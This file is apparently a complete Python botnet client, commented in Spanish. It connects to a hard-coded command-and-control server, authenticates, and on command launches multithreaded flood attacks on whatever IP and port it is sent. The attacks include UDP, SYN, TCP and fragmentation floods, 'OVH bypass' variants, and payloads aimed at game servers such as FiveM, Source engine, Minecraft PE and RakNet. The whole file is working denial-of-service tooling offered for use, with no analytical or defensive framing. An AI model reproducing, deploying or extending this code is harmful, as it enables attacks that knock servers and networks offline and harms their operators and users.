import subprocess, random, os, time, threading, socket, sys, struct, zlib, json, base64, math, string, signal, hashlib
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

# ─── Configuración ─────────────────────────────────────────────────────────────
C2_ADDRESS  = "45.13.236.245"  # CAMBIA ESTO POR TU IP
C2_PORT     = 26110            # CAMBIA ESTO POR TU PUERTO
RECONNECT_DELAY = 5

# ─── Ataques ──────────────────────────────────────────────────────────────────
user_attacks = {}
mcbot_bots = []
mcbot_lock = threading.Lock()
mcbot_should_stop = False

payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'
payload_stdhex = b'\x00' * 1024

PACKET_SIZES = [1024, 2048]

def get_architecture():
    try:
        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
        return result.decode().strip()
    except:
        return 'unknown'

def generate_end(length=4, chara='\n\r'):
    return ''.join(random.choice(chara) for _ in range(length))

# ─── UDP PPS ──────────────────────────────────────────────────────────────────
def attack_udp_pps(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = b'\x00' * 64
        while time.time() < secs:
            if stop_event.is_set():
                break
            for _ in range(50):
                try:
                    sock.sendto(packet, (ip, port))
                except:
                    pass
    except:
        pass

# ─── UDP Bypass ──────────────────────────────────────────────────────────────
def attack_udp_bypass(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(random.choice(PACKET_SIZES))
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass

def attack_udp_bypass_v2(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(random.choice([512, 1024, 2048]))
            for _ in range(5):
                try:
                    sock.sendto(packet, (ip, port))
                except:
                    pass
    except:
        pass

# ─── RakNet ──────────────────────────────────────────────────────────────────
def attack_raknet(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        rak_packet = b'\x01' + b'\x00' * 23 + b'\x00\x00'
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(rak_packet, (ip, port))
            except:
                pass
    except:
        pass

# ─── OVH UDP ─────────────────────────────────────────────────────────────────
def attack_ovh_udp(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = random._urandom(65000)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass

# ─── TCP ─────────────────────────────────────────────────────────────────────
def attack_tcp(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            packet = random._urandom(1024)
            start = time.time()
            while time.time() - start < 2 and not stop_event.is_set():
                try:
                    s.send(packet)
                except:
                    break
            s.close()
        except:
            pass

# ─── UDP Fragment ────────────────────────────────────────────────────────────
def attack_udp_frag(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(65000)
            try:
                sock.sendto(packet[:random.randint(1000, 65000)], (ip, port))
            except:
                pass
    except:
        pass

# ─── UDP Game ────────────────────────────────────────────────────────────────
def attack_udp_game(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(random.choice([512, 780, 1024, 1032]))
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass

# ─── UDP Query ───────────────────────────────────────────────────────────────
def attack_udp_query(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        query = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(query, (ip, port))
            except:
                pass
    except:
        pass

# ─── HEX ─────────────────────────────────────────────────────────────────────
def attack_hex(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_hex, (ip, port))
            except:
                pass
    except:
        pass

def attack_stdhex(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_stdhex, (ip, port))
            except:
                pass
    except:
        pass

# ─── SYN ─────────────────────────────────────────────────────────────────────
def attack_syn(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send(os.urandom(1024))
            s.close()
        except:
            pass

# ─── MIX ─────────────────────────────────────────────────────────────────────
def attack_mix(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            if random.choice([True, False]):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                s.send(random._urandom(1024))
                s.close()
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (ip, port))
        except:
            pass

# ─── MCPE ────────────────────────────────────────────────────────────────────
def attack_mcpe(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_mcpe, (ip, port))
            except:
                pass
    except:
        pass

# ─── FIVEM ──────────────────────────────────────────────────────────────────
def attack_fivem(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_fivem, (ip, port))
            except:
                pass
    except:
        pass

# ─── VSE ────────────────────────────────────────────────────────────────────
def attack_vse(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_vse, (ip, port))
            except:
                pass
    except:
        pass

# ─── TCP OVH ─────────────────────────────────────────────────────────────────
def attack_tcp_ovh(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            packet = random._urandom(65000)
            for _ in range(10):
                try:
                    s.send(packet[:1400])
                except:
                    break
            s.close()
        except:
            pass

# ─── OVH UDP ─────────────────────────────────────────────────────────────────
def attack_ovh_udp_alt(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = random._urandom(65000)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass

def lunch_attack(method, ip, port, secs, stop_event):
    methods = {
        '.HEX': attack_hex,
        '.STDHEX': attack_stdhex,
        '.UDP': attack_udp_bypass,
        '.UDPFRAG': attack_udp_frag,
        '.UDPGAME': attack_udp_game,
        '.UDPPPS': attack_udp_pps,
        '.UDPQUERY': attack_udp_query,
        '.UDPBYPASS': attack_udp_bypass,
        '.UDPBYPASSV2': attack_udp_bypass_v2,
        '.TCP': attack_tcp,
        '.TCPOVH': attack_tcp_ovh,
        '.MIX': attack_mix,
        '.SYN': attack_syn,
        '.VSE': attack_vse,
        '.MCPE': attack_mcpe,
        '.FIVEM': attack_fivem,
        '.RAKNET': attack_raknet,
        '.OVHUDP': attack_ovh_udp_alt,
        '.OVHTCP': attack_tcp_ovh,
        '.MCBOT': None,
    }
    if method in methods and methods[method] is not None:
        methods[method](ip, port, secs, stop_event)

def start_attack(method, ip, port, duration, thread_count, username):
    stop_event = threading.Event()
    end_time = time.time() + duration

    for _ in range(thread_count):
        t = threading.Thread(target=lunch_attack, args=(method, ip, port, end_time, stop_event), daemon=True)
        t.start()

        if username not in user_attacks:
            user_attacks[username] = []
        user_attacks[username].append((t, stop_event))

def stop_attacks(username):
    if username in user_attacks:
        for t, stop_event in user_attacks[username]:
            stop_event.set()
        user_attacks[username].clear()

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    global mcbot_should_stop
    
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.settimeout(10)
            
            print(f"[*] Conectando a {C2_ADDRESS}:{C2_PORT}...")
            c2.connect((C2_ADDRESS, C2_PORT))
            print("[+] Conectado!")

            # Autenticación
            auth_step = 0
            while auth_step < 2:
                try:
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send(get_architecture().encode())
                        auth_step = 1
                    elif 'Password' in data and auth_step == 1:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        auth_step = 2
                except socket.timeout:
                    continue
                except:
                    break
            
            if auth_step < 2:
                raise Exception("Auth failed")
            
            print('✅ Autenticado!')
            
            while True:
                try:
                    data = c2.recv(1024).decode().strip()
                    if not data:
                        continue

                    args = data.split(' ')
                    command = args[0].upper()

                    if command == 'PING':
                        c2.send('PONG'.encode())

                    elif command == 'STOP' and len(args) > 1:
                        username = args[1]
                        stop_attacks(username)

                    elif command == '.MCBOT':
                        # Solo reenviamos el comando, no ejecutamos nada
                        pass

                    else:
                        if len(args) >= 4:
                            method = command
                            ip = args[1]
                            port = int(args[2])
                            secs = int(args[3])
                            threads = int(args[4]) if len(args) >= 5 else 1
                            username = args[5] if len(args) >= 6 else "default"

                            start_attack(method, ip, port, secs, threads, username)
                except socket.timeout:
                    continue
                except:
                    break
                    
            c2.close()
            
        except Exception as e:
            print(f"❌ Error: {e}")
        
        print(f"[*] Reintentando en {RECONNECT_DELAY} segundos...")
        time.sleep(RECONNECT_DELAY)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Detenido")
        sys.exit(0)
    except:
        pass
